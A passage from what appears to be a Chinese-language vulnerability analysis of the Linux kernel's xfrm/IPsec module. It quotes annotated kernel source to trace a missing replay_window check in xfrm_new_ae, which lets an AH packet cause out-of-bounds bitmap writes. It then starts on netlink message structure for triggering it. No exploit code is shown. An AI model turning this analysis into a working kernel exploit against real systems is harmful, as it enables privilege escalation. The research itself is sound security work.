verify_auth_trunc(attrs)))//XFRMA_ALG_AUTH_TRUNC参数长度检查 goto out; if ((err = verify_one_alg(attrs, XFRMA_ALG_AUTH)))//XFRMA_ALG_AUTH参数长度检查 goto out; if ((err = verify_one_alg(attrs, XFRMA_ALG_CRYPT)))//XFRMA_ALG_CRYPT参数长度检查 goto out; if ((err = verify_one_alg(attrs, XFRMA_ALG_COMP)))//XFRMA_ALG_COMP参数长度检查 goto out; if ((err = verify_sec_ctx_len(attrs)))//XFRMA_SEC_CTX数据长度定义检查 goto out;[1] if ((err = verify_replay(p, attrs)))//XFRMA_REPLAY_ESN_VAL数据检查 goto out; err = -EINVAL; switch (p-&gt;mode) &#123; case XFRM_MODE_TRANSPORT: case XFRM_MODE_TUNNEL: case XFRM_MODE_ROUTEOPTIMIZATION: case XFRM_MODE_BEET: break; default: goto out; &#125; err = 0;out: return err;&#125; 在verify_replay函数中，可以看到检查主要有如下几条：[1]bmp_len是否超过最大值，最大值定义为4096/4/8。[2]检查参数长度定义是否正确。[3]是否为IPPROTO_ESP或者IPPROTO_AH协议。 1234567891011121314151617181920212223242526272829303132static inline int verify_replay(struct xfrm_usersa_info *p, struct nlattr **attrs)&#123; struct nlattr *rt = attrs[XFRMA_REPLAY_ESN_VAL]; struct xfrm_replay_state_esn *rs; if (p-&gt;flags &amp; XFRM_STATE_ESN) &#123; if (!rt) return -EINVAL; rs = nla_data(rt);[1] if (rs-&gt;bmp_len &gt; XFRMA_REPLAY_ESN_MAX / sizeof(rs-&gt;bmp[0]) / 8)// (4096/4/8) return -EINVAL;[2] if (nla_len(rt) &lt; xfrm_replay_state_esn_len(rs) &amp;&amp; nla_len(rt) != sizeof(*rs)) //bmp[0]=NULL 或 bmp+head &lt; nla_len return -EINVAL; &#125; if (!rt) return 0; /* As only ESP and AH support ESN feature. */[3] if ((p-&gt;id.proto != IPPROTO_ESP) &amp;&amp; (p-&gt;id.proto != IPPROTO_AH)) return -EINVAL; if (p-&gt;replay_window != 0) return -EINVAL; return 0;&#125; 回到xfrm_add_sa函数，继续分析xfrm_state_construct函数。首先在xfrm_state_alloc中用调用kzalloc函数新建xfrm_state，并拷贝用户数据进行赋值。接下来根据用户输入的各种参数进行类型构建。关于xfrm_replay_state_esn这个结构体在[3]处申请，在[4]处进行验证。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687static struct xfrm_state *xfrm_state_construct(struct net *net, struct xfrm_usersa_info *p, struct nlattr **attrs, int *errp)&#123;[1] struct xfrm_state *x = xfrm_state_alloc(net); //新建 xfrm_state 结构 int err = -ENOMEM; if (!x) goto error_no_put;[2] copy_from_user_state(x, p); //拷贝用户数据 if (attrs[XFRMA_SA_EXTRA_FLAGS]) x-&gt;props.extra_flags = nla_get_u32(attrs[XFRMA_SA_EXTRA_FLAGS]); if ((err = attach_aead(x, attrs[XFRMA_ALG_AEAD]))) goto error; if ((err = attach_auth_trunc(&amp;x-&gt;aalg, &amp;x-&gt;props.aalgo, attrs[XFRMA_ALG_AUTH_TRUNC]))) goto error; if (!x-&gt;props.aalgo) &#123; if ((err = attach_auth(&amp;x-&gt;aalg, &amp;x-&gt;props.aalgo, attrs[XFRMA_ALG_AUTH]))) goto error; &#125; if ((err = attach_crypt(x, attrs[XFRMA_ALG_CRYPT]))) goto error; if ((err = attach_one_algo(&amp;x-&gt;calg, &amp;x-&gt;props.calgo, xfrm_calg_get_byname, attrs[XFRMA_ALG_COMP]))) goto error; if (attrs[XFRMA_ENCAP]) &#123; x-&gt;encap = kmemdup(nla_data(attrs[XFRMA_ENCAP]), sizeof(*x-&gt;encap), GFP_KERNEL); if (x-&gt;encap == NULL) goto error; &#125; if (attrs[XFRMA_TFCPAD]) x-&gt;tfcpad = nla_get_u32(attrs[XFRMA_TFCPAD]); if (attrs[XFRMA_COADDR]) &#123; x-&gt;coaddr = kmemdup(nla_data(attrs[XFRMA_COADDR]), sizeof(*x-&gt;coaddr), GFP_KERNEL); if (x-&gt;coaddr == NULL) goto error; &#125; xfrm_mark_get(attrs, &amp;x-&gt;mark); err = __xfrm_init_state(x, false); if (err) goto error; if (attrs[XFRMA_SEC_CTX]) &#123; err = security_xfrm_state_alloc(x, nla_data(attrs[XFRMA_SEC_CTX])); if (err) goto error; &#125; //对x-&gt;replay_esn、x-&gt;preplay_esn初始化为用户输入XFRMA_REPLAY_ESN_VAL参数[3] if ((err = xfrm_alloc_replay_state_esn(&amp;x-&gt;replay_esn, &amp;x-&gt;preplay_esn, attrs[XFRMA_REPLAY_ESN_VAL]))) goto error; x-&gt;km.seq = p-&gt;seq; x-&gt;replay_maxdiff = net-&gt;xfrm.sysctl_aevent_rseqth; /* sysctl_xfrm_aevent_etime is in 100ms units */ x-&gt;replay_maxage = (net-&gt;xfrm.sysctl_aevent_etime*HZ)/XFRM_AE_ETH_M;[4] if ((err = xfrm_init_replay(x)))//检查滑动窗口大小及flag，确定检测使用的函数 goto error; /* override default values from above */ xfrm_update_ae_params(x, attrs, 0); return x;error: x-&gt;km.state = XFRM_STATE_DEAD; xfrm_state_put(x);error_no_put: *errp = err; return NULL;&#125; 在xfrm_alloc_replay_state_esn中，可以看到通过kzalloc函数分别申请了两块同样大小的内存，大小为sizeof(*replay_esn) + replay_esn-&gt;bmp_len * sizeof(__u32)，并将用户数据中attr[XFRMA_REPLAY_ESN_VAL]内容复制过去。 1234567891011121314151617181920212223242526272829303132static int xfrm_alloc_replay_state_esn(struct xfrm_replay_state_esn **replay_esn, struct xfrm_replay_state_esn **preplay_esn, struct nlattr *rta)&#123; struct xfrm_replay_state_esn *p, *pp, *up; int klen, ulen; if (!rta) return 0; up = nla_data(rta); klen = xfrm_replay_state_esn_len(up); ulen = nla_len(rta) &gt;= klen ? klen : sizeof(*up); p = kzalloc(klen, GFP_KERNEL); if (!p) return -ENOMEM; pp = kzalloc(klen, GFP_KERNEL); if (!pp) &#123; kfree(p); return -ENOMEM; &#125; memcpy(p, up, ulen); memcpy(pp, up, ulen); *replay_esn = p; *preplay_esn = pp; return 0;&#125; 最终在xfrm_init_replay函数中对上述申请的结构体数据进行检查，replay_window不大于定义的bmp_len大小，并对x-&gt;repl进行初始化，该成员是一个函数虚表，作用是在收到AH或ESP协议数据包时进行数据重放检查。 123456789101112131415161718192021int xfrm_init_replay(struct xfrm_state *x)&#123; struct xfrm_replay_state_esn *replay_esn = x-&gt;replay_esn; if (replay_esn) &#123; if (replay_esn-&gt;replay_window &gt; replay_esn-&gt;bmp_len * sizeof(__u32) * 8)//不大于bmp本身长度 return -EINVAL; if (x-&gt;props.flags &amp; XFRM_STATE_ESN) &#123; if (replay_esn-&gt;replay_window == 0) return -EINVAL; x-&gt;repl = &amp;xfrm_replay_esn; &#125; else x-&gt;repl = &amp;xfrm_replay_bmp; &#125; else x-&gt;repl = &amp;xfrm_replay_legacy; return 0;&#125;EXPORT_SYMBOL(xfrm_init_replay); xfrm_replay_state_esn结构体更新对于一个SA，内核提供修改replay_esn 成员的功能，也就是xfrm_alloc_replay_state_esn申请的第一个内存块。在xfrm_new_ae函数中，首先在[1]处循环查找哈希链表，得到xfrm_state结构体，查找标识是之前提到的三个要素。而在[2]处，对用户输入的attr[XFRMA_REPLAY_ESN_VAL]参数进行检查，也就是修改后的replay_esn 成员内容。最后在[3]处，利用memcpy进行成员内容修改。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950static int xfrm_new_ae(struct sk_buff *skb, struct nlmsghdr *nlh, struct nlattr **attrs)&#123; struct net *net = sock_net(skb-&gt;sk); struct xfrm_state *x; struct km_event c; int err = -EINVAL; u32 mark = 0; struct xfrm_mark m; struct xfrm_aevent_id *p = nlmsg_data(nlh); struct nlattr *rp = attrs[XFRMA_REPLAY_VAL]; struct nlattr *re = attrs[XFRMA_REPLAY_ESN_VAL]; struct nlattr *lt = attrs[XFRMA_LTIME_VAL]; struct nlattr *et = attrs[XFRMA_ETIMER_THRESH]; struct nlattr *rt = attrs[XFRMA_REPLAY_THRESH]; if (!lt &amp;&amp; !rp &amp;&amp; !re &amp;&amp; !et &amp;&amp; !rt) return err; /* pedantic mode - thou shalt sayeth replaceth */ if (!(nlh-&gt;nlmsg_flags&amp;NLM_F_REPLACE)) return err; mark = xfrm_mark_get(attrs, &amp;m); //copy XFRMA_MARK变量，返回值是u32[1] x = xfrm_state_lookup(net, mark, &amp;p-&gt;sa_id.daddr, p-&gt;sa_id.spi, p-&gt;sa_id.proto, p-&gt;sa_id.family); //循环查找hash表，得到xfrm_state结构体 if (x == NULL) return -ESRCH; if (x-&gt;km.state != XFRM_STATE_VALID) goto out;[2] err = xfrm_replay_verify_len(x-&gt;replay_esn, re); //XFRMA_REPLAY_ESN_VAL参数检查 if (err) goto out; spin_lock_bh(&amp;x-&gt;lock);[3] xfrm_update_ae_params(x, attrs, 1); //memcpy spin_unlock_bh(&amp;x-&gt;lock); c.event = nlh-&gt;nlmsg_type; c.seq = nlh-&gt;nlmsg_seq; c.portid = nlh-&gt;nlmsg_pid; c.data.aevent = XFRM_AE_CU; km_state_notify(x, &amp;c); err = 0;out: xfrm_state_put(x); return err;&#125; 验证过程在xfrm_replay_verify_len函数中，可见在检查过程中主要检查了修改部分的bmp_len长度，该检查是因为replay_esn成员内存是直接进行复制的，不再二次分配。但缺少了对replay_window变量的检测，导致引用replay_window变量进行bitmap读写时造成的数组越界问题。 1234567891011121314151617static inline int xfrm_replay_verify_len(struct xfrm_replay_state_esn *replay_esn, struct nlattr *rp)&#123; struct xfrm_replay_state_esn *up; int ulen; if (!replay_esn || !rp) return 0; up = nla_data(rp); ulen = xfrm_replay_state_esn_len(up); if (nla_len(rp) &lt; ulen || xfrm_replay_state_esn_len(replay_esn) != ulen) //自身长度逻辑正确，ulen与原len相同 return -EINVAL; return 0;&#125; 数组越界写定位通过对xfrm模块代码中，replay_window关键字的查找，可以发现主要对这个关键字的操作位于xfrm_replay_advance_esn和xfrm_replay_check_esn函数中。而通过这两个函数的查找发现二者位于同一 结构体xfrm_replay_esn下， 1234567static const struct xfrm_replay xfrm_replay_esn = &#123; .advance = xfrm_replay_advance_esn, .check = xfrm_replay_check_esn, .recheck = xfrm_replay_recheck_esn, .notify = xfrm_replay_notify_esn, .overflow = xfrm_replay_overflow_esn,&#125;; 而定义这个结构体，可以发现这个结构体在之前提到过的xfrm_init_replay函数中被使用，并为x-&gt;repl成员赋值，因此转而寻找x-&gt;repl成员被调用的位置，最终跟踪到了xfrm_input函数，而xfrm_input函数之前被xfrm4_rcv_spi &lt;= xfrm4_rcv &lt;= xfrm4_ah_rcv 最终追溯到AH协议的内核协议栈中。 123456static const struct net_protocol ah4_protocol = &#123; .handler = xfrm4_ah_rcv, .err_handler = xfrm4_ah_err, .no_policy = 1, .netns_ok = 1,&#125;; 可见，通过发送AH数据包可以触发越界读写。 在xfrm_input函数中，首先在[1]处利用AH数据包数据找到对应的SA，在[2]处调用xfrm_replay_check_esn进行检查，再调用xfrm_replay_recheck_esn再次检查，最终在[3]处调用xfrm_replay_advance_esn。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205int xfrm_input(struct sk_buff *skb, int nexthdr, __be32 spi, int encap_type)&#123; struct net *net = dev_net(skb-&gt;dev); int err; __be32 seq; __be32 seq_hi; struct xfrm_state *x = NULL; xfrm_address_t *daddr; struct xfrm_mode *inner_mode; u32 mark = skb-&gt;mark; unsigned int family; int decaps = 0; int async = 0; /* A negative encap_type indicates async resumption. */ if (encap_type &lt; 0) &#123; //here is zero async = 1; x = xfrm_input_state(skb); seq = XFRM_SKB_CB(skb)-&gt;seq.input.low; family = x-&gt;outer_mode-&gt;afinfo-&gt;family; goto resume; &#125; daddr = (xfrm_address_t *)(skb_network_header(skb) + XFRM_SPI_SKB_CB(skb)-&gt;daddroff); family = XFRM_SPI_SKB_CB(skb)-&gt;family; /* if tunnel is present override skb-&gt;mark value with tunnel i_key */ switch (family) &#123; case AF_INET: if (XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip4) // p32 mark = be32_to_cpu(XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip4-&gt;parms.i_key); break; case AF_INET6: if (XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip6) mark = be32_to_cpu(XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip6-&gt;parms.i_key); break; &#125; /* Allocate new secpath or COW existing one. */ if (!skb-&gt;sp || atomic_read(&amp;skb-&gt;sp-&gt;refcnt) != 1) &#123; struct sec_path *sp; sp = secpath_dup(skb-&gt;sp); if (!sp) &#123; XFRM_INC_STATS(net, LINUX_MIB_XFRMINERROR); goto drop; &#125; if (skb-&gt;sp) secpath_put(skb-&gt;sp); skb-&gt;sp = sp; &#125; seq = 0; if (!spi &amp;&amp; (err = xfrm_parse_spi(skb, nexthdr, &amp;spi, &amp;seq)) != 0) &#123; //spi =0 XFRM_INC_STATS(net, LINUX_MIB_XFRMINHDRERROR); goto drop; &#125; do &#123; if (skb-&gt;sp-&gt;len == XFRM_MAX_DEPTH) &#123; XFRM_INC_STATS(net, LINUX_MIB_XFRMINBUFFERERROR); goto drop; &#125;[1] x = xfrm_state_lookup(net, mark, daddr, spi, nexthdr, family);//找到对应的xfrm_state if (x == NULL) &#123; XFRM_INC_STATS(net, LINUX_MIB_XFRMINNOSTATES); xfrm_audit_state_notfound(skb, family, spi, seq); goto drop; &#125; skb-&gt;sp-&gt;xvec[skb-&gt;sp-&gt;len++] = x; spin_lock(&amp;x-&gt;lock); if (unlikely(x-&gt;km.state != XFRM_STATE_VALID)) &#123; if (x-&gt;km.state == XFRM_STATE_ACQ) XFRM_INC_STATS(net, LINUX_MIB_XFRMACQUIREERROR); else XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEINVALID); goto drop_unlock; &#125; if ((x-&gt;encap ? x-&gt;encap-&gt;encap_type : 0) != encap_type) &#123; XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMISMATCH); goto drop_unlock; &#125; //x-&gt;repl 在 xfrm_init_replay赋值，可调用xfrm_replay_check_esn[2] if (x-&gt;repl-&gt;check(x, skb, seq)) &#123; XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATESEQERROR); goto drop_unlock; &#125; if (xfrm_state_check_expire(x)) &#123;//check x-&gt;lft内容 XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEEXPIRED); goto drop_unlock; &#125; spin_unlock(&amp;x-&gt;lock); //检查tunnel参数 if (xfrm_tunnel_check(skb, x, family)) &#123; XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMODEERROR); goto drop; &#125; //根据x-&gt;replay_esn中，seq、replay_windows关系，返回seqhi seq_hi = htonl(xfrm_replay_seqhi(x, seq)); XFRM_SKB_CB(skb)-&gt;seq.input.low = seq; XFRM_SKB_CB(skb)-&gt;seq.input.hi = seq_hi; skb_dst_force(skb); dev_hold(skb-&gt;dev); nexthdr = x-&gt;type-&gt;input(x, skb); if (nexthdr == -EINPROGRESS) return 0;resume: dev_put(skb-&gt;dev); spin_lock(&amp;x-&gt;lock); if (nexthdr &lt;= 0) &#123; if (nexthdr == -EBADMSG) &#123; xfrm_audit_state_icvfail(x, skb, x-&gt;type-&gt;proto); x-&gt;stats.integrity_failed++; &#125; XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEPROTOERROR); goto drop_unlock; &#125; /* only the first xfrm gets the encap type */ encap_type = 0; // async = 0 并调用xfrm_replay_recheck_esn if (async &amp;&amp; x-&gt;repl-&gt;recheck(x, skb, seq)) &#123; XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATESEQERROR); goto drop_unlock; &#125; //调用xfrm_replay_advance_esn[3] x-&gt;repl-&gt;advance(x, seq); x-&gt;curlft.bytes += skb-&gt;len; x-&gt;curlft.packets++; spin_unlock(&amp;x-&gt;lock); XFRM_MODE_SKB_CB(skb)-&gt;protocol = nexthdr; inner_mode = x-&gt;inner_mode; if (x-&gt;sel.family == AF_UNSPEC) &#123; inner_mode = xfrm_ip2inner_mode(x, XFRM_MODE_SKB_CB(skb)-&gt;protocol); if (inner_mode == NULL) &#123; XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMODEERROR); goto drop; &#125; &#125; if (inner_mode-&gt;input(x, skb)) &#123; XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMODEERROR); goto drop; &#125; if (x-&gt;outer_mode-&gt;flags &amp; XFRM_MODE_FLAG_TUNNEL) &#123; decaps = 1; break; &#125; /* * We need the inner address. However, we only get here for * transport mode so the outer address is identical. */ daddr = &amp;x-&gt;id.daddr; family = x-&gt;outer_mode-&gt;afinfo-&gt;family; err = xfrm_parse_spi(skb, nexthdr, &amp;spi, &amp;seq); if (err &lt; 0) &#123; XFRM_INC_STATS(net, LINUX_MIB_XFRMINHDRERROR); goto drop; &#125; &#125; while (!err); err = xfrm_rcv_cb(skb, family, x-&gt;type-&gt;proto, 0); if (err) goto drop; nf_reset(skb); if (decaps) &#123; skb_dst_drop(skb); netif_rx(skb); return 0; &#125; else &#123; return x-&gt;inner_mode-&gt;afinfo-&gt;transport_finish(skb, async); &#125;drop_unlock: spin_unlock(&amp;x-&gt;lock);drop: xfrm_rcv_cb(skb, family, x &amp;&amp; x-&gt;type ? x-&gt;type-&gt;proto : nexthdr, -1); kfree_skb(skb); return 0;&#125; 在xfrm_replay_check_esn函数中，首先找到的还是x-&gt;replay_esn成员，接着检查[1]处某bit是否为1，否则退出。首先可以分析出该bit的计算方法，是nr&gt;&gt;5，即(nr / 32)，而bitnr = nr % 32，而bmp的类型为u32，即bmp[i]的大小为4*8 bit，不难发现，bmp的作用就是表示某个值是否被占用。取一个情况bitnr = (pos - diff) % replay_esn-&gt;replay_window，其中pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window，diff = top - seq =replay_esn-&gt;seq - seq，因此bitnr = (seq - 1 )% replay_esn-&gt;replay_window，即AH中的seq是否被处理过。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758static int xfrm_replay_check_esn(struct xfrm_state *x, struct sk_buff *skb, __be32 net_seq)&#123; unsigned int bitnr, nr; u32 diff; struct xfrm_replay_state_esn *replay_esn = x-&gt;replay_esn; u32 pos; u32 seq = ntohl(net_seq); u32 wsize = replay_esn-&gt;replay_window; u32 top = replay_esn-&gt;seq; u32 bottom = top - wsize + 1; if (!wsize) return 0; if (unlikely(seq == 0 &amp;&amp; replay_esn-&gt;seq_hi == 0 &amp;&amp; (replay_esn-&gt;seq &lt; replay_esn-&gt;replay_window - 1))) goto err; diff = top - seq; if (likely(top &gt;= wsize - 1)) &#123; /* A. same subspace */ if (likely(seq &gt; top) || seq &lt; bottom) return 0; &#125; else &#123; /* B. window spans two subspaces */ if (likely(seq &gt; top &amp;&amp; seq &lt; bottom)) return 0; if (seq &gt;= bottom) diff = ~seq + top + 1; &#125; if (diff &gt;= replay_esn-&gt;replay_window) &#123; x-&gt;stats.replay_window++; goto err; &#125; pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window; if (pos &gt;= diff) bitnr = (pos - diff) % replay_esn-&gt;replay_window; else bitnr = replay_esn-&gt;replay_window - (diff - pos); nr = bitnr &gt;&gt; 5; bitnr = bitnr &amp; 0x1F;[1] if (replay_esn-&gt;bmp[nr] &amp; (1U &lt;&lt; bitnr)) goto err_replay; return 0;err_replay: x-&gt;stats.replay++;err: xfrm_audit_state_replay(x, skb, net_seq); return -EINVAL;&#125; 而在xfrm_replay_advance_esn函数中，共有三处对bmp的写操作，其中在[1]处对于某一个bit执行&amp;0，将导致某一个bit被置零。在[2]处，可以发现函数对从bmp[0]到bmp[(replay_esn-&gt;replay_window - 1) &gt;&gt; 5]块内存均置零，而[3]处，这可以对某一个bit写1。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455static void xfrm_replay_advance_esn(struct xfrm_state *x, __be32 net_seq)&#123; unsigned int bitnr, nr, i; int wrap; u32 diff, pos, seq, seq_hi; struct xfrm_replay_state_esn *replay_esn = x-&gt;replay_esn; if (!replay_esn-&gt;replay_window) return; seq = ntohl(net_seq); pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window; seq_hi = xfrm_replay_seqhi(x, net_seq); wrap = seq_hi - replay_esn-&gt;seq_hi; if ((!wrap &amp;&amp; seq &gt; replay_esn-&gt;seq) || wrap &gt; 0) &#123; if (likely(!wrap)) diff = seq - replay_esn-&gt;seq; else diff = ~replay_esn-&gt;seq + seq + 1; if (diff &lt; replay_esn-&gt;replay_window) &#123; for (i = 1; i &lt; diff; i++) &#123; bitnr = (pos + i) % replay_esn-&gt;replay_window; nr = bitnr &gt;&gt; 5; bitnr = bitnr &amp; 0x1F;[1] replay_esn-&gt;bmp[nr] &amp;= ~(1U &lt;&lt; bitnr); &#125; &#125; else &#123; nr = (replay_esn-&gt;replay_window - 1) &gt;&gt; 5; for (i = 0; i &lt;= nr; i++)[2] replay_esn-&gt;bmp[i] = 0; &#125; bitnr = (pos + diff) % replay_esn-&gt;replay_window; replay_esn-&gt;seq = seq; if (unlikely(wrap &gt; 0)) replay_esn-&gt;seq_hi++; &#125; else &#123; diff = replay_esn-&gt;seq - seq; if (pos &gt;= diff) bitnr = (pos - diff) % replay_esn-&gt;replay_window; else bitnr = replay_esn-&gt;replay_window - (diff - pos); &#125; nr = bitnr &gt;&gt; 5; bitnr = bitnr &amp; 0x1F;[3] replay_esn-&gt;bmp[nr] |= (1U &lt;&lt; bitnr); if (xfrm_aevent_is_on(xs_net(x))) x-&gt;repl-&gt;notify(x, XFRM_REPLAY_UPDATE);&#125; 因此，通过用户态空间发送一个AH数据包将导致，一个bit的内存写，或者一段空间的置零。 漏洞触发与利用netlink套接字通信与熟悉的驱动或内核模块所使用的系统调用或ioctl机制不同，本漏洞触发使用过的是netlink通信机制。 Netlink 是一种特殊的 socket，它是 Linux 所特有的，类似于 BSD 中的AF_ROUTE 但又远比它的功能强大。目前在Linux 内核中使用netlink 进行应用与内核通信的应用很多; 包括：路由 daemon（NETLINK_ROUTE），用户态 socket 协议（NETLINK_USERSOCK），防火墙（NETLINK_FIREWALL），netfilter 子系统（NETLINK_NETFILTER），内核事件向用户态通知（NETLINK_KOBJECT_UEVENT）， 通用 netlink（NETLINK_GENERIC）等。 而基于netlink的内核通信与socket的通信方式一致，都是通过sendto()，recvfrom()； sendmsg(), recvmsg()的用户态API。 而发送到内核态的数据以协议包的形式进行解析，因此需要了解xfrm数据包的协议格式，其协议结构图及相关函数图示如下。 1234567891011121314151617181920212223242526272829303132333435363738394041/* ======================================================================== * Netlink Messages and Attributes Interface (As Seen On TV) * ------------------------------------------------------------------------ * Messages Interface * ------------------------------------------------------------------------ * * Message Format: * &lt;--- nlmsg_total_size(payload) ---&gt; * &lt;-- nlmsg_msg_size(payload) -&gt; * +----------+- - -+-------------+- - -+-------- - - * | nlmsghdr | Pad | Payload | Pad | nlmsghdr * +----------+- - -+-------------+- - -+-------- - - * nlmsg_data(nlh)---^ ^ * nlmsg_next(nlh)-----------------------+ * * Payload Format: * &lt;---------------------- nlmsg_len(nlh) ---------------------&gt; * &lt;------ hdrlen ------&gt; &lt;- nlmsg_attrlen(nlh, hdrlen) -&gt; * +----------------------+- - -+--------------------------------+ * | Family Header | Pad | Attributes | * +----------------------+- - -+--------------------------------+ * nlmsg_attrdata(nlh, hdrlen)---^ * * Data Structures: * struct nlmsghdr netlink message header * ------------------------------------------------------------------------ * Attributes Interface * ------------------------------------------------------------------------ * * Attribute Format: * &lt;------- nla_total_size(payload) -------&gt; * &lt;---- nla_attr_size(payload) -----&gt; * +----------+- - -+- - - - - - - - - +- - -+-------- - - * | Header | Pad | Payload | Pad | Header * +----------+- - -+- - - - - - - - - +- - -+-------- - - * &lt;- nla_len(nla) -&gt; ^ * nla_data(nla)----^ | * nla_next(nla)-----------------------------' * * Data Structures: * struct nlattr netlink attribute header 从上图可以看出，发送到内核的数据需要如下形式nlmsghdr + Family Header + n * (nla + data)。 首先从xfrm_netlink_rcv函数中调用netlink_rcv_skb函数，会检查nlmsg_type及nlmsg_len范围，并交由cb函数处理，其赋值为xfrm_user_rcv_msg。 12345678910111213141516171819202122232425262728293031323334353637383940int netlink_rcv_skb(struct sk_buff *skb, int (*cb)(struct sk_buff *, struct nlmsghdr *))&#123; struct nlmsghdr *nlh; int err; while (skb-&gt;len &gt;= nlmsg_total_size(0)) &#123; int msglen; nlh = nlmsg_hdr(skb); err = 0; if (nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN || skb-&gt;len &lt; nlh-&gt;nlmsg_len) return 0; /* Only requests are handled by the kernel */ if (!(nlh-&gt;nlmsg_flags &amp; NLM_F_REQUEST)) goto ack; /* Skip control messages */ if (nlh-&gt;nlmsg_type &lt; NLMSG_MIN_TYPE) goto ack; err = cb(skb, nlh); if (err == -EINTR) goto skip;ack: if (nlh-&gt;nlmsg_flags &amp; NLM_F_ACK || err) netlink_ack(skb, nlh, err);skip: msglen = NLMSG_ALIGN(nlh-&gt;nlmsg_len); if (msglen &gt; skb-&gt;len) msglen = skb-&gt;len; skb_pull(skb, msglen); &#125; return 0;&#125; 在xfrm_user_rcv_msg函数中，会根据nlmsg_type到xfrm_dispatch中查找对应要调用的函数，并在[2]处检查对应需要的权限，而在[3]处会根据nla中参数类型，来初始化一个** attr，作为用户输入参数的索引。最终调用link-&gt;doit去执行。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849static int xfrm_user_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)&#123; struct net *net = sock_net(skb-&gt;sk); struct nlattr *attrs[XFRMA_MAX+1]; const struct xfrm_link *link; int type, err;#ifdef CONFIG_COMPAT if (in_compat_syscall()) return -EOPNOTSUPP;#endif type = nlh-&gt;nlmsg_type; if (type &gt; XFRM_MSG_MAX) return -EINVAL; type -= XFRM_MSG_BASE;[1] link = &amp;xfrm_dispatch[type]; /* All operations require privileges, even GET */[2] if (!netlink_net_capable(skb, CAP_NET_ADMIN)) //检查进程权限 return -EPERM; if ((type == (XFRM_MSG_GETSA - XFRM_MSG_BASE) || type == (XFRM_MSG_GETPOLICY - XFRM_MSG_BASE)) &amp;&amp; (nlh-&gt;nlmsg_flags &amp; NLM_F_DUMP)) &#123; if (link-&gt;dump == NULL) return -EINVAL; &#123; struct netlink_dump_control c = &#123; .dump = link-&gt;dump, .done = link-&gt;done, &#125;; return netlink_dump_start(net-&gt;xfrm.nlsk, skb, nlh, &amp;c); &#125; &#125;[3] err = nlmsg_parse(nlh, xfrm_msg_min[type], attrs, link-&gt;nla_max ? : XFRMA_MAX, link-&gt;nla_pol ? : xfrma_policy); if (err &lt; 0) return err; if (link-&gt;doit == NULL) return -EINVAL; return link-&gt;doit(skb, nlh, attrs);&#125; 从xfrm_dispatch可见，我们所需的XFRM_MSG_NEWSA及XFRM_MSG_NEWAE，仅需将nlmsg_type设置为相应值即可。 12345678910111213141516171819202122232425262728xfrm_dispatch[XFRM_NR_MSGTYPES] = &#123; [XFRM_MSG_NEWSA - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_sa &#125;, [XFRM_MSG_DELSA - XFRM_MSG_BASE] = &#123; .doit = xfrm_del_sa &#125;, [XFRM_MSG_GETSA - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_sa, .dump = xfrm_dump_sa, .done = xfrm_dump_sa_done &#125;, [XFRM_MSG_NEWPOLICY - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_policy &#125;, [XFRM_MSG_DELPOLICY - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_policy &#125;, [XFRM_MSG_GETPOLICY - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_policy, .dump = xfrm_dump_policy, .done = xfrm_dump_policy_done &#125;, [XFRM_MSG_ALLOCSPI - XFRM_MSG_BASE] = &#123; .doit = xfrm_alloc_userspi &#125;, [XFRM_MSG_ACQUIRE - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_acquire &#125;, [XFRM_MSG_EXPIRE - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_sa_expire &#125;, [XFRM_MSG_UPDPOLICY - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_policy &#125;, [XFRM_MSG_UPDSA - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_sa &#125;, [XFRM_MSG_POLEXPIRE - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_pol_expire&#125;, [XFRM_MSG_FLUSHSA - XFRM_MSG_BASE] = &#123; .doit = xfrm_flush_sa &#125;, [XFRM_MSG_FLUSHPOLICY - XFRM_MSG_BASE] = &#123; .doit = xfrm_flush_policy &#125;, [XFRM_MSG_NEWAE - XFRM_MSG_BASE] = &#123; .doit = xfrm_new_ae &#125;, [XFRM_MSG_GETAE - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_ae &#125;, [XFRM_MSG_MIGRATE - XFRM_MSG_BASE] = &#123; .doit = xfrm_do_migrate &#125;, [XFRM_MSG_GETSADINFO - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_sadinfo &#125;, [XFRM_MSG_NEWSPDINFO - XFRM_MSG_BASE] = &#123; .doit = xfrm_set_spdinfo, .nla_pol = xfrma_spd_policy, .nla_max = XFRMA_SPD_MAX &#125;, [XFRM_MSG_GETSPDINFO - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_spdinfo 